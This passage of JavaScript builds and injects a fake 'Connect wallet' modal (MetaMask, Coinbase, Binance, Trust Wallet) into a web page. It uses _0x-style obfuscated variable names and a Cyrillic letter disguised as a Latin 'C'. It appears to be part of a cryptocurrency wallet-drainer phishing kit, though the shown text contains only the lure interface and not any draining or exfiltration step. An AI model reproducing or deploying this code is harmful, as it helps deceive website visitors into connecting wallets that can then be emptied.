21.7337L25.6151 21.823L22.6057 26.2943L22.0745 21.6024L21.957 21.6155ZM24.8876 16.1318L24.8826 16.0137L17.8857 16.2974L17.7982 16.3418L17.7745 16.4368L18.4364 20.0299L18.537 20.1255L18.6589 20.0593L19.6489 17.9899L22.0014 19.0755L22.1345 19.0518L24.9707 16.2155L24.9951 16.0843L24.882 16.0137L24.8876 16.1318L24.8039 16.048L22.0257 18.8262L19.6426 17.7262L19.4864 17.7824L18.6032 19.6287L18.032 16.5274L24.8926 16.2499L24.8876 16.1318ZM9.94886 18.9687L9.99823 19.0762L12.3507 17.9905L13.3407 20.0599L13.4626 20.1262L13.5632 20.0305L14.2251 16.4374L14.2014 16.3424L14.1139 16.298L7.11698 16.0143L7.00386 16.0849L7.02823 16.2162L9.86448 19.0524L9.99761 19.0762L9.94886 18.9687L10.0326 18.8849L7.41011 16.2624L13.9682 16.528L13.397 19.6293L12.5139 17.783L12.3576 17.7268L9.89948 18.8612L9.94886 18.9687Z\"fill=#CC6228></path><path d=\"M7.11255 16.0376L10.0438 21.8051L9.94942 18.9688C9.9488 18.9688 7.11255 16.132 7.11255 16.0376ZM22.0513 18.9688L21.9569 21.8051L24.8882 16.0376L22.0513 18.9688ZM14.1088 16.4157L13.4469 20.0088L14.2975 24.2638L14.4869 18.6857L14.1088 16.4157ZM17.8913 16.4157L17.5132 18.6851L17.7025 24.2632L18.5532 20.0082L17.8913 16.4157Z\"fill=#E27525></path><path d=\"M7.11251 16.0379L7.00688 16.0916L9.93813 21.8591L10.0731 21.9197L10.1619 21.8016L10.0675 18.9654L10.0331 18.886C10.0319 18.8847 9.32438 18.1772 8.61563 17.4566C8.26126 17.0966 7.90688 16.7335 7.64188 16.4547C7.50938 16.3154 7.39938 16.1979 7.32313 16.1129L7.23751 16.0135L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.22001 15.9904L7.19876 16.0041L7.22126 15.9935L7.12813 16.0391H7.23126L7.22126 15.9935L7.12813 16.0391H7.23126H7.11251L7.00688 16.0929L7.11251 16.0379H6.99438L7.02188 16.1197C7.08063 16.206 7.27126 16.4091 7.54751 16.6985C8.36813 17.5554 9.86501 19.0522 9.86563 19.0529L9.94938 18.9691L9.83126 18.9729L9.90813 21.2772L7.21813 15.9841L7.08501 15.9229L6.99438 16.0379H7.11251ZM22.0513 18.9691L21.9331 18.9654L21.8388 21.8016L21.9275 21.9197L22.0625 21.8591L24.9938 16.0916L24.9569 15.9416L24.8031 15.9554L21.9669 18.8866L21.9338 18.9647L22.0513 18.9691L22.1363 19.051L24.4269 16.6841L22.0925 21.2772L22.1694 18.9729L22.0513 18.9691ZM14.1088 16.416L13.9925 16.3947L13.3306 19.9879L13.3313 20.0322L14.1819 24.2872L14.3075 24.3816L14.4163 24.2679L14.6056 18.6897L14.6044 18.6666L14.2263 16.3972L14.1106 16.2985L13.9931 16.3954L14.1088 16.416L13.9919 16.4354L14.3681 18.6929L14.2138 23.2429L13.5669 20.0079L14.2244 16.4372L14.1088 16.416ZM17.8913 16.416L17.7744 16.3966L17.3963 18.666L17.395 18.6891L17.5844 24.2672L17.6931 24.381L17.8188 24.2866L18.6694 20.0316L18.67 19.9872L18.0081 16.3941L17.8906 16.2972L17.775 16.396L17.8913 16.416L17.775 16.4372L18.4325 20.0079L17.7856 23.2422L17.6313 18.6929L18.0075 16.4354L17.8913 16.416Z\"fill=#E27525></path><path d=\"M18.5531 20.0088L17.7025 24.2638L18.27 24.6419L21.9575 21.8056L22.0519 18.9694L18.5531 20.0088ZM9.94873 18.9688L10.0431 21.805L13.7306 24.6413L14.2981 24.2631L13.4475 20.0081L9.94873 18.9688Z\"fill=#F5841F></path><path d=\"M18.5531 20.0087L18.4374 19.9856L17.5868 24.2406L17.6374 24.3619L18.2049 24.74L18.3424 24.7356L22.0299 21.8994L22.0762 21.8094L22.1706 18.9731L22.1249 18.8756L22.0193 18.8556L18.5212 19.8956L18.4387 19.9856L18.5531 20.0087L18.5868 20.1219L21.9281 19.1287L21.8406 21.7456L18.2643 24.4962L17.8331 24.2087L18.6687 20.0319L18.5531 20.0087ZM9.94869 18.9687L9.83057 18.9725L9.92494 21.8087L9.97119 21.8987L13.6587 24.735L13.7962 24.7394L14.3637 24.3612L14.4143 24.24L13.5637 19.985L13.4812 19.895L9.98307 18.855L9.87744 18.875L9.83182 18.9725L9.94869 18.9687L9.91494 19.0819L13.3449 20.1019L14.1662 24.2094L13.7356 24.4969L10.1593 21.7462L10.0668 18.9656L9.94869 18.9687Z\"fill=#F5841F></path><path d=\"M18.6475 28.5182V27.3832L18.3637 27.0995H13.6362L13.3525 27.3832V28.5182L9.38184 26.627L10.8 27.7613L13.5418 29.6526H18.3637L21.2 27.7613L22.5237 26.627L18.6475 28.5182Z\"fill=#C0AC9D></path><path d=\"M18.6475 28.5181H18.7656V27.3831L18.7313 27.3L18.4475 27.0163L18.3638 26.9813H13.6363L13.5525 27.0163L13.2688 27.3L13.2344 27.3831V28.3306L9.4325 26.52L9.28125 26.5644L9.3075 26.7194L10.7262 27.8538L10.7325 27.8588L13.4744 29.75L13.5419 29.7706H18.3638L18.4294 29.7506L21.2656 27.86L21.2769 27.8513L22.6006 26.7169L22.6225 26.5619L22.4719 26.5206L18.5956 28.4119L18.6475 28.5181H18.7656H18.6475L18.6994 28.6244L21.7463 27.1375L21.1288 27.6669L18.3281 29.5344H13.5788L10.8706 27.6669L10.2531 27.1731L13.3019 28.6244L13.4156 28.6175L13.4706 28.5181V27.4325L13.685 27.2175H18.315L18.5294 27.4325V28.5181L18.585 28.6181L18.6994 28.6244L18.6475 28.5181Z\"fill=#C0AC9D></path><path d=\"M18.3638 24.6413L17.7963 24.2632H14.2982L13.7307 24.6413L13.3525 27.3832L13.6363 27.0994H18.3638L18.6475 27.3832L18.3638 24.6413Z\"fill=#161616></path><path d=\"M18.3637 24.6413L18.4293 24.5431L17.8618 24.165L17.7962 24.145H14.2981L14.2325 24.165L13.665 24.5431L13.6137 24.625L13.2356 27.3669L13.3 27.4894L13.4362 27.4669L13.685 27.2175H18.315L18.5637 27.4669L18.6981 27.49L18.765 27.3713L18.4812 24.6294L18.4293 24.5431L18.3637 24.6413L18.2462 24.6538L18.4956 27.0644L18.4475 27.0163L18.3637 26.9813H13.6362L13.5525 27.0163L13.5175 27.0513L13.8406 24.71L14.3337 24.3813H17.7606L18.2981 24.74L18.3637 24.6413L18.2462 24.6538L18.3637 24.6413Z\"fill=#161616></path><path d=\"M30.8445 10.1759L31.8845 5.07027L30.372 0.342773L18.3645 9.23027L22.9976 13.1065L29.5213 14.9978L30.9395 13.2959L30.2776 12.8234L31.2232 11.8778L30.467 11.3103L31.4126 10.554L30.8445 10.1759ZM0.115723 5.07027L1.15572 10.1759L0.493848 10.6484L1.53385 11.4046L0.777598 11.9721L1.72322 12.9178L1.06135 13.3903L2.47947 15.0921L9.00322 13.2009L13.6363 9.32465L1.72322 0.342773L0.115723 5.07027Z\"fill=#763E1A></path><path d=\"M30.8444 10.1757L30.96 10.1995L32 5.09324L31.9969 5.03387L30.4844 0.306367L30.4081 0.230117L30.3013 0.247617L18.2938 9.13512L18.2456 9.22637L18.2881 9.32074L22.9212 13.197L22.9644 13.2201L29.4881 15.1114L29.6119 15.0732L31.03 13.3714L31.0562 13.2807L31.0075 13.1995L30.4594 12.8076L31.3062 11.9607L31.3406 11.8689L31.2938 11.7826L30.6594 11.307L31.4856 10.6457L31.53 10.5482L31.4775 10.4551L30.91 10.077L30.8444 10.1757L30.7787 10.2739L31.2119 10.5626L30.3925 11.2182L30.3481 11.3126L30.3956 11.4051L31.0431 11.8907L30.1938 12.7401L30.1594 12.8332L30.2087 12.9195L30.7669 13.3182L29.4794 14.8626L23.0531 13.0001L18.5544 9.23574L30.3088 0.535742L31.7619 5.07699L30.7281 10.1526L30.7781 10.2745L30.8444 10.1757ZM0.115625 5.07012L0 5.09324L1.025 10.1239L0.425625 10.552L0.37625 10.6476L0.425 10.7439L1.33563 11.4064L0.7075 11.8776L0.660625 11.9639L0.695 12.0557L1.54188 12.9026L0.99375 13.2945L0.945 13.3757L0.97125 13.4664L2.38937 15.1682L2.51312 15.2064L9.03687 13.3151L9.08 13.292L13.7131 9.41574L13.7556 9.32199L13.7087 9.23074L1.79437 0.248242L1.68875 0.229492L1.61188 0.304492L0.00375 5.03199L0 5.09324L0.115625 5.07012L0.2275 5.10824L1.7825 0.535742L13.4462 9.33012L8.94625 13.0951L2.52063 14.9576L1.23312 13.4126L1.79125 13.0139L1.84063 12.9276L1.80625 12.8345L0.956875 11.9851L1.60438 11.4995L1.65188 11.4039L1.60312 11.3089L0.695625 10.6489L1.22375 10.2714L1.27062 10.1514L0.231875 5.04637L0.115625 5.07012Z\"fill=#763E1A></path><path d=\"M29.4257 14.9976L22.9019 13.1064L24.8875 16.0376L21.9563 21.7108H25.8325H31.6L29.4257 14.9976ZM9.09817 13.1064L2.57441 14.9976L0.399414 21.7108H6.16691H10.0432L7.11192 16.0376L9.09817 13.1064ZM17.8913 16.4158L18.3638 9.23014L20.255 4.12451H11.84L13.7313 9.23014L14.1094 16.4158L14.2988 18.6851V24.2633H17.7969V18.6851L17.8913 16.4158Z\"fill=#F5841F></path><path d=\"M29.4256 14.9977L29.4587 14.884L22.935 12.9927L22.8062 13.0365L22.8037 13.1721L24.75 16.0452L21.8512 21.6559L21.855 21.7715L21.9562 21.8284H25.8325H31.6L31.6956 21.7796L31.7125 21.674L29.5381 14.9609L29.4587 14.884L29.4256 14.9977L29.3131 15.034L31.4375 21.5921H25.8325H22.15L24.9919 16.0915L24.985 15.9709L23.1831 13.3109L29.3925 15.1109L29.4256 14.9977ZM9.09812 13.1065L9.06499 12.9927L2.54124 14.884L2.46187 14.9609L0.286865 21.674L0.30374 21.7802L0.399365 21.829H6.16687H10.0431L10.1437 21.7721L10.1475 21.6565L7.24874 16.0459L9.19499 13.1727L9.19249 13.0371L9.06374 12.9934L9.09812 13.1065L8.99999 13.0402L7.01437 15.9715L7.00749 16.0921L9.84937 21.5927H6.16687H0.561865L2.66687 15.094L9.13062 13.2202L9.09812 13.1065ZM17.8912 16.4159L18.0094 16.4234L18.4812 9.25461L20.3662 4.16523L20.3525 4.05648L20.2556 4.00586H11.84L11.7431 4.05648L11.7294 4.16523L13.6137 9.25398L13.9912 16.4221V16.4259L14.18 18.6902V24.2634L14.2144 24.3471L14.2981 24.3815H17.7962L17.88 24.3471L17.9144 24.2634V18.6877L18.0087 16.4209L17.8912 16.4159L17.7731 16.4109L17.6787 18.6802V18.6852V24.1452H14.4169V18.6852L14.4162 18.6752L14.2275 16.4077L13.8494 9.22336L13.8425 9.18836L12.0106 4.24211H20.0856L18.2537 9.18836L18.2469 9.22148L17.7744 16.4071V16.4102L17.8912 16.4159Z\"fill=#F5841F></path></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>MetaMask</span> <span class=modal-el-desc-second>Connnect to your MetaMask wallet</span></div></div><div class=menu-el data=2><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_248)><path d=\"M16 0C24.8375 0 32 7.1625 32 16C32 24.8375 24.8375 32 16 32C7.1625 32 0 24.8375 0 16C0 7.1625 7.1625 0 16 0Z\"fill=#0052FF></path><path d=\"M16.0031 21.625C12.8969 21.625 10.3781 19.1094 10.3781 16C10.3781 12.8906 12.8969 10.375 16.0031 10.375C18.7875 10.375 21.1 12.4062 21.5438 15.0625H27.2094C26.7313 9.2875 21.8969 4.75 16 4.75C9.7875 4.75 4.75 9.7875 4.75 16C4.75 22.2125 9.7875 27.25 16 27.25C21.8969 27.25 26.7313 22.7125 27.2094 16.9375H21.5406C21.0938 19.5938 18.7875 21.625 16.0031 21.625Z\"fill=white></path></g><defs><clipPath id=clip0_73_248><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Coinbase</span> <span class=modal-el-desc-second>Connnect to your Coinbase wallet</span></div></div><div class=menu-el data=3><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_337)><path d=\"M7.24266 16L3.63808 19.6046L0.0244141 16L3.629 12.3955L7.24266 16ZM16.0044 7.23827L22.1876 13.4214L25.7922 9.81686L16.0044 0.0200195L6.20759 9.81686L9.81218 13.4214L16.0044 7.23827ZM28.3708 12.3955L24.7662 16L28.3708 19.6046L31.9754 16L28.3708 12.3955ZM16.0044 24.7618L9.82126 18.5786L6.21667 22.1832L16.0044 31.9801L25.7922 22.1832L22.1876 18.5786L16.0044 24.7618ZM16.0044 19.6046L19.609 16L16.0044 12.3955L12.3908 16L16.0044 19.6046Z\"fill=#F0B90B></path></g><defs><clipPath id=clip0_73_337><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Binance Wallet</span> <span class=modal-el-desc-second>Connnect to your Binance wallet</span></div></div><div class=menu-el data=4><div class=modal-icon><svg fill=none height=32 viewBox=\"0 0 32 32\"width=32 xmlns=http://www.w3.org/2000/svg><g clip-path=url(#clip0_73_86)><path d=\"M0 8.125C0 3.63769 3.63769 0 8.125 0H23.875C28.3623 0 32 3.63769 32 8.125V23.875C32 28.3623 28.3623 32 23.875 32H8.125C3.63769 32 0 28.3623 0 23.875V8.125Z\"fill=#F1F7FE></path><path d=\"M16.0094 6.71875C19.2381 9.41525 22.9407 9.24894 23.9985 9.24894C23.7671 24.5846 22.004 21.5436 16.0094 25.8438C10.0147 21.5436 8.26266 24.5846 8.03125 9.24894C9.07809 9.24894 12.7807 9.41525 16.0094 6.71875Z\"stroke=#3375BB stroke-linecap=round stroke-linejoin=round stroke-miterlimit=10 stroke-width=2.56></path></g><defs><clipPath id=clip0_73_86><rect fill=white height=32 width=32></rect></clipPath></defs></svg></div><div class=modal-el-desc><span class=modal-el-desc-first>Trust Wallet</span> <span class=modal-el-desc-second>Connnect to your Trust wallet</span></div></div></div></div><div class=modal-bottom><button><svg fill=none height=24 viewBox=\"0 0 25 24\"width=25 xmlns=http://www.w3.org/2000/svg><path d=\"M9.875 3.375H5.75C5.25272 3.375 4.77581 3.57254 4.42417 3.92417C4.07254 4.27581 3.875 4.75272 3.875 5.25V9.375C3.875 9.87228 4.07254 10.3492 4.42417 10.7008C4.77581 11.0525 5.25272 11.25 5.75 11.25H9.875C10.3723 11.25 10.8492 11.0525 11.2008 10.7008C11.5525 10.3492 11.75 9.87228 11.75 9.375V5.25C11.75 4.75272 11.5525 4.27581 11.2008 3.92417C10.8492 3.57254 10.3723 3.375 9.875 3.375ZM9.5 9H6.125V5.625H9.5V9ZM9.875 12.75H5.75C5.25272 12.75 4.77581 12.9475 4.42417 13.2992C4.07254 13.6508 3.875 14.1277 3.875 14.625V18.75C3.875 19.2473 4.07254 19.7242 4.42417 20.0758C4.77581 20.4275 5.25272 20.625 5.75 20.625H9.875C10.3723 20.625 10.8492 20.4275 11.2008 20.0758C11.5525 19.7242 11.75 19.2473 11.75 18.75V14.625C11.75 14.1277 11.5525 13.6508 11.2008 13.2992C10.8492 12.9475 10.3723 12.75 9.875 12.75ZM9.5 18.375H6.125V15H9.5V18.375ZM19.25 3.375H15.125C14.6277 3.375 14.1508 3.57254 13.7992 3.92417C13.4475 4.27581 13.25 4.75272 13.25 5.25V9.375C13.25 9.87228 13.4475 10.3492 13.7992 10.7008C14.1508 11.0525 14.6277 11.25 15.125 11.25H19.25C19.7473 11.25 20.2242 11.0525 20.5758 10.7008C20.9275 10.3492 21.125 9.87228 21.125 9.375V5.25C21.125 4.75272 20.9275 4.27581 20.5758 3.92417C20.2242 3.57254 19.7473 3.375 19.25 3.375ZM18.875 9H15.5V5.625H18.875V9ZM13.25 16.125V13.875C13.25 13.5766 13.3685 13.2905 13.5795 13.0795C13.7905 12.8685 14.0766 12.75 14.375 12.75C14.6734 12.75 14.9595 12.8685 15.1705 13.0795C15.3815 13.2905 15.5 13.5766 15.5 13.875V16.125C15.5 16.4234 15.3815 16.7095 15.1705 16.9205C14.9595 17.1315 14.6734 17.25 14.375 17.25C14.0766 17.25 13.7905 17.1315 13.5795 16.9205C13.3685 16.7095 13.25 16.4234 13.25 16.125ZM21.125 15.375C21.125 15.6734 21.0065 15.9595 20.7955 16.1705C20.5845 16.3815 20.2984 16.5 20 16.5H18.875V19.5C18.875 19.7984 18.7565 20.0845 18.5455 20.2955C18.3345 20.5065 18.0484 20.625 17.75 20.625H14.375C14.0766 20.625 13.7905 20.5065 13.5795 20.2955C13.3685 20.0845 13.25 19.7984 13.25 19.5C13.25 19.2016 13.3685 18.9155 13.5795 18.7045C13.7905 18.4935 14.0766 18.375 14.375 18.375H16.625V13.875C16.625 13.5766 16.7435 13.2905 16.9545 13.0795C17.1655 12.8685 17.4516 12.75 17.75 12.75C18.0484 12.75 18.3345 12.8685 18.5455 13.0795C18.7565 13.2905 18.875 13.5766 18.875 13.875V14.25H20C20.2984 14.25 20.5845 14.3685 20.7955 14.5795C21.0065 14.7905 21.125 15.0766 21.125 15.375Z\"fill=white></path></svg> \u0421onnect by QR-code</button> <span>\u0421onnect by QR-code with WalletConnect</span></div></div>";
const inject_modal = () => {
  try {
    let _0x3c7138 = document.createElement("style");
    _0x3c7138.id = 'web3-style';
    _0x3c7138.innerHTML = MS_Modal_Data[0x0].data;
    document.head.appendChild(_0x3c7138);
    let _0x138445 = document.createElement("div");
    _0x138445.id = "web3-overlay";
    _0x138445.classList = ["web3-overlay"];
    _0x138445.style.display = "none";
    document.body.prepend(_0x138445);
    document.querySelector('.web3-overlay').addEventListener("click", () => {
      ms_hide();
    });
    let _0x5c2398 = document.createElement("div");
    _0x5c2398.id = 'web3-modal';
    _0x5c2398.classList = ["web3-modal"];
    _0x5c2398.style.display = 'none';
    _0x5c2398.innerHTML = MS_Modal_Data[0x1].data;
    document.body.prepend(_0x5c2398);
    let _0xb7a06d = document.createElement("style");
    _0xb7a06d.innerHTML = "@import url(https://fonts.googleapis.com/css2?family=Manrope:wght@400;500&display=swap);#overlay { position: fixed; display: block; width: 100%; height: 100%; top: 0; background-color: rgb(0 0 0/25%); left: 0; right: 0; bottom: 0; z-index: 99999; }.modal{position:absolute;top:150%;left:50%;transform:translate(-50%,-50%);-ms-transform:translate(-50%,-50%);box-sizing:border-box;width:100%;display:flex;max-width:440px;font-family:Manrope;flex-direction:column;color:#01091b;align-items:flex-start;background:#fff;border-radius:24px}.modal-head{display:flex;padding:32px 24px;justify-content:space-between;align-items:center;box-sizing:border-box}.modal-head-block-f{display:flex;flex-direction:column;align-items:flex-start;gap:8px}.modal-head-title{font-size:22px;font-weight:500}.modal-head-desc{color:#677189;font-size:16px;max-width:279px;font-weight:400}.modal-close{display:flex;padding:12px;align-items:flex-start;gap:8px;justify-content:end;position:absolute;right:8px;top:8px;cursor:pointer}.modal-main{display:flex;padding:0 24px 32px 24px;flex-direction:column;gap:20px}.modal-main-title{font-size:16px;font-weight:500}.modal-main-menu{display:flex;align-items:flex-start;align-content:flex-start;gap:16px;align-self:stretch;flex-wrap:wrap;justify-content:center}.menu-el{display:flex;padding:16px;flex-direction:column;align-items:flex-start;gap:32px;box-sizing:border-box;cursor:pointer;max-width:188px;border-radius:16px;border:1px solid #d3e5ed}.modal-el-desc{display:flex;flex-direction:column;align-items:flex-start;gap:4px;align-self:stretch}span.modal-el-desc-first{font-size:16px;font-style:normal;font-weight:500}span.modal-el-desc-second{color:#677189;font-size:14px;font-style:normal;font-weight:400;align-self:stretch}.modal-icon{display:flex;width:32px;height:32px;justify-content:center;align-items:center}.menu-el:hover{border:1px solid #0052ff}.modal-bottom{display:flex;padding:0 24px 24px 24px;flex-direction:column;align-items:center;gap:16px;align-self:stretch}.modal-bottom button{border-radius:16px;background:#0052ff;display:flex;padding:16px 0;justify-content:center;align-items:center;gap:8px;align-self:stretch;outline:0;cursor:pointer;border:0;color:#fff;font-size:16px;font-weight:500}.modal-bottom span{color:#677189;font-size:14px;font-style:normal;font-weight:300}.modal.black{background:#161a1e;color:#f5f5f5}.modal.black .menu-el{border:1px solid #2c3437}.modal.black .menu-el:hover{border:1px solid #0052ff}.modal.black .modal-head-desc{color:#a7a8aa}.modal.black span.modal-el-desc-second{color:#a7a8aa}.modal.black .modal-bottom span{color:#a7a8aa}@media (min-width:375px) and (max-width:450px){.menu-el{max-width:100%;width:100%;flex-direction:row}}@media (min-width:150px) and (max-width:375px){.menu-el{max-width:100%;width:100%;flex-direction:row}span.modal-el-desc-second {display: none;}.modal-el-desc {justify-content: center;align-items: center;}}";
    document.head.appendChild(_0xb7a06d);
    let _0x44f8e5 = document.createElement("div");
    _0x44f8e5.id = "overlay";
    _0x44f8e5.style.display = "none";
    _0x44f8e5.innerHTML = "<div class=\"modal black\" style=\"display: none;\"><div class=modal-head><div class=modal-head-block-f><div class=modal-head-title>Connect wallet</div><div class=modal-head-desc>Choose what network and wallet want to connect below</div></div><div class=modal-close><svg fill=none height=24 viewBox=\"0 0 24 24\"width=24 xmlns=http://www.w3.org/2000/svg><path d=\"M5.31854 5.31952C5.74457 4.89349 6.4353 4.89349 6.86132 5.31952L11.5445 10.0027L16.2276 5.31952C16.6537 4.89349 17.3444 4.89349 17.7704 5.31952C18.1964 5.74555 18.1964 6.43627 17.7704 6.8623L13.0873 11.5455L17.7704 16.2286C18.1964 16.6546 18.1964 17.3454 17.7704 17.7714C17.3444 18.1974 16.6537 18.1974 16.2276 17.7714L11.5445 13.0882L6.86132 17.7714C6.4353 18.1974 5.74457 18.1974 5.31854 17.7714C4.89252 17.3454 4.89252 16.6546 5.31854 16.2286L10.0017 11.5455L5.31854 6.8623C4.89252 6.43627 4.89252 5.74555 5.31854 5.31952Z\"fill=#C4C4C4 clip-rule=evenodd fill-rule=evenodd></path></svg></div></div><div class=modal-main><div class=modal-main-title>Choose Network</div><div class=modal-main-menu><div class=menu-el data=1><div class=modal-icon><svg fill=none height=30 viewBox=\"0 0 32 30\"width=32 xmlns=http://www.w3.org/2000/svg><path d=\"M30.3712 0.342773L17.9856 9.51402L20.255 4.12465L30.3712 0.342773Z\"fill=#E17726></path><path d=\"M30.3713 0.342559L30.3013 0.247559L18.262 9.16193L20.3438 4.21693L30.4126 0.453184L30.3713 0.342559L30.3013 0.247559L30.3713 0.342559L30.3301 0.231934L20.2132 4.01381L20.1457 4.07818L17.877 9.46756L17.9126 9.60631L18.0557 9.60881L30.442 0.437559L30.4751 0.285684L30.3301 0.231934L30.3713 0.342559Z\"fill=#E17726></path><path d=\"M1.72316 0.342773L14.0144 9.6084L11.84 4.12465L1.72316 0.342773ZM25.8332 21.6159L22.5238 26.6271L29.615 28.6128L31.6007 21.7109C31.695 21.7109 25.8332 21.6159 25.8332 21.6159ZM0.399414 21.8053L2.38504 28.7071L9.47629 26.7215L6.16691 21.7103C6.16691 21.6159 0.399414 21.8053 0.399414 21.8053Z\"fill=#E27625></path><path d=\"M1.72314 0.342559L1.65189 0.436934L13.9431 9.70256L14.0856 9.70193L14.1238 9.56443L11.95 4.08068L11.8813 4.01381L1.76439 0.231934L1.61939 0.285684L1.65189 0.436934L1.72314 0.342559L1.68189 0.453184L11.7494 4.21693L13.7494 9.26068L1.79439 0.248184L1.72314 0.342559ZM25.8331 21.6157L25.7344 21.5507L22.425 26.5619L22.4131 26.6682L22.4919 26.7407L29.5831 28.7263L29.7288 28.6451L31.7144 21.7432L31.6006 21.7107V21.8288L31.6113 21.8282L31.7169 21.7351L31.6581 21.6069L31.6156 21.5932L31.5856 21.5919C31.2344 21.5851 25.8344 21.4976 25.8344 21.4976L25.7338 21.5507L25.8331 21.6157L25.8313 21.7338C25.8344 21.7338 27.2731 21.7569 28.7156 21.7807C29.4369 21.7926 30.1575 21.8044 30.6988 21.8132C30.9694 21.8176 31.1944 21.8213 31.3519 21.8238L31.535 21.8269L31.5831 21.8276H31.595H31.5969L31.5994 21.7569L31.5956 21.8276H31.5969L31.5994 21.7569L31.5956 21.8276L31.6013 21.7157L31.5919 21.8276H31.5956L31.6013 21.7157L31.5919 21.8276L31.6013 21.7107L31.5838 21.8269L31.5913 21.8276L31.6006 21.7107L31.5831 21.8269L31.6006 21.7101L31.5688 21.8238L31.5831 21.8269L31.6006 21.7101L31.5906 21.5926L31.5994 21.6969V21.5919L31.5906 21.5926L31.5994 21.6969V21.5919L31.4856 21.6776L29.5325 28.4669L22.7106 26.5569L25.9306 21.6813L25.8331 21.6157ZM0.399395 21.8051L0.285645 21.8376L2.27127 28.7394L2.41689 28.8207L9.50815 26.8351L9.58689 26.7626L9.57502 26.6563L6.26565 21.6451L6.16689 21.7101H6.28502L6.22627 21.6057L6.12002 21.5782C6.01877 21.5688 5.82877 21.5651 5.56752 21.5651C4.08627 21.5651 0.396895 21.6863 0.39627 21.6863L0.304395 21.7351L0.28627 21.8376L0.399395 21.8051L0.403145 21.9232C0.408145 21.9232 4.09502 21.8019 5.5669 21.8019C5.75065 21.8019 5.8994 21.8038 6.00065 21.8082L6.11064 21.8157L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.12377 21.8176L6.14752 21.7338L6.10252 21.8076L6.16252 21.7101H6.0494L6.10315 21.8076L6.16315 21.7101H6.05002L6.0694 21.7751L9.2894 26.6507L2.46627 28.5613L0.513145 21.7726L0.399395 21.8051Z\"fill=#E27625></path><path d=\"M9.09817 13.1062L7.11255 16.0375L14.1094 16.3212L13.92 8.75746L9.09817 13.1062ZM22.9969 13.1062L18.0807 8.75684L17.8913 16.4156L24.8882 16.1318C24.8875 16.0375 22.9969 13.1062 22.9969 13.1062ZM9.4763 26.7212L13.7313 24.6412L10.0438 21.805L9.4763 26.7212ZM18.3638 24.6412L22.6188 26.7212L22.0513 21.805C21.9569 21.805 18.3638 24.6412 18.3638 24.6412Z\"fill=#E27625></path><path d=\"M9.09809 13.1066L8.99996 13.0403L7.01434 15.9716L7.00684 16.0909L7.10746 16.1559L14.1043 16.4397L14.1918 16.4059L14.2268 16.3191L14.0375 8.75531L13.9662 8.64969L13.8406 8.67031L9.01871 13.0191L8.99996 13.0403L9.09809 13.1066L9.17746 13.1941L13.8087 9.01719L13.9881 16.1978L7.32996 15.9278L9.19621 13.1728L9.09809 13.1066ZM22.9968 13.1066L23.075 13.0178L18.1587 8.66844L18.0331 8.64844L17.9618 8.75406L17.7725 16.4128L17.8075 16.4997L17.895 16.5334L24.8925 16.2503L25.0056 16.1322L24.9906 16.0684C24.9531 15.9834 24.825 15.7722 24.6412 15.4741C24.0943 14.5897 23.0962 13.0428 23.0956 13.0422L23.0743 13.0178L22.9968 13.1066L22.8975 13.1703C22.8987 13.1716 23.37 13.9028 23.8425 14.6472C24.0787 15.0191 24.315 15.3941 24.4918 15.6816C24.58 15.8253 24.6537 15.9466 24.7043 16.0341L24.7618 16.1366L24.7737 16.1616L24.8662 16.1322H24.77L24.7743 16.1616L24.8668 16.1322H24.7706H24.8887L24.8837 16.0141L18.0131 16.2928L18.1931 9.01406L22.9193 13.1953L22.9968 13.1066ZM9.47621 26.7216L9.52809 26.8278L13.7831 24.7478L13.8487 24.6534L13.8031 24.5478L10.1156 21.7116L9.99746 21.6966L9.92621 21.7916L9.35871 26.7078L9.40809 26.8178L9.52809 26.8272L9.47621 26.7216L9.59371 26.7353L10.1368 22.0259L13.5075 24.6191L9.42371 26.6153L9.47621 26.7216ZM18.3637 24.6416L18.3118 24.7478L22.5668 26.8278L22.6868 26.8184L22.7362 26.7084L22.1687 21.7922L22.0512 21.6878L21.9743 21.7109C21.8812 21.7641 21.6237 21.9572 21.2618 22.2322C20.1868 23.0522 18.2906 24.5497 18.29 24.5497L18.2456 24.6553L18.3112 24.7491L18.3637 24.6416L18.4368 24.7341C18.4387 24.7328 19.335 24.0253 20.2443 23.3166C20.6993 22.9622 21.1568 22.6078 21.5062 22.3422C21.6806 22.2097 21.8287 22.0991 21.9343 22.0228L22.0587 21.9359L22.0893 21.9166L22.0906 21.9159L22.0506 21.8234V21.9234L22.0906 21.9159L22.0506 21.8234V21.9234V21.8053L21.9331 21.8191L22.4756 26.5209L18.415 24.5359L18.3637 24.6416Z\"fill=#E27625></path><path d=\"M22.5238 26.7216L18.2688 24.6416L18.6469 27.3835V28.5179L22.5238 26.7216ZM9.47632 26.7216L13.4476 28.6129V27.4785L13.8257 24.7366L9.47632 26.7216Z\"fill=#D5BFB2></path><path d=\"M22.5238 26.7214L22.5757 26.6152L18.3207 24.5352L18.1994 24.5458L18.1519 24.6577L18.5288 27.3914V28.5177L18.5832 28.617L18.6963 28.6245L22.5725 26.8283L22.6413 26.722L22.575 26.6145L22.5238 26.7214L22.4738 26.6139L18.765 28.3327V27.3833L18.7638 27.367L18.4157 24.8452L22.4713 26.8277L22.5238 26.7214ZM9.47628 26.7214L9.42565 26.8283L13.3969 28.7195L13.5107 28.7127L13.5657 28.6127V27.4864L13.9425 24.752L13.8963 24.6408L13.7769 24.6283L9.42753 26.6139L9.35815 26.7202L9.42565 26.8277L9.47628 26.7214L9.52565 26.8289L13.6794 24.9327L13.3307 27.4614L13.3294 27.4777V28.4252L9.52753 26.6145L9.47628 26.7214Z\"fill=#D5BFB2></path><path d=\"M13.4476 20.0088L9.94946 18.9688L12.4076 17.8345L13.4476 20.0088ZM18.5532 20.0088L19.5932 17.8345L22.0513 18.9688L18.5532 20.0088Z\"fill=#233447></path><path d=\"M13.4474 20.0089L13.4812 19.8958L10.283 18.9452L12.3512 17.9908L13.3412 20.0602L13.4474 20.0089L13.5543 19.9577L12.5143 17.7833L12.358 17.7271L9.89991 18.8614L9.83179 18.9771L9.91616 19.0821L13.4143 20.1221L13.538 